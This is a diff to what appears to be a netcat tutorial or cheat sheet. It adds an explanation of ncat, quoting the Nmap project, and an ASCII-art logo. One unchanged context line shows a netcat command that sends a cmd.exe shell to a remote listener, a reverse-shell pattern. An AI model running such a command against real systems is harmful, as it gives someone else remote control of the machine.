@@ -54,5 +54,23 @@ This is the one you will be using the most
 
 `Cmd line: -nv 192.168.2.130 4444 -e cmd.exe`
 
+## [What is ncat?](https://nmap.org/ncat/)
 
+It's just a modern implementation of netcat by the authors of nmap. They describe it as: 
+
+"_Ncat is a feature-packed networking utility which reads and writes data across networks from the command line. Ncat was written for the Nmap Project as a much-improved re-implementation of the venerable_ [_Netcat_](http://sectools.org/tool/netcat/)_. It uses both TCP and UDP for communication and is designed to be a reliable back-end tool to instantly provide network connectivity to other applications and users. Ncat will not only work with IPv4 and IPv6 but provides the user with a virtually limitless number of potential uses._"
+
+```groovy
+  .       .       
+  \`-"'"-'/       
+   } 6 6 {        
+  ==. Y ,==       
+    /^^^\  .      
+   /     \  )     
+  (  )-(  )/     _
+  -""---""---   / 
+ /   Ncat    \_/  
+(     ____        
+ \_.=|____E       
+```
 
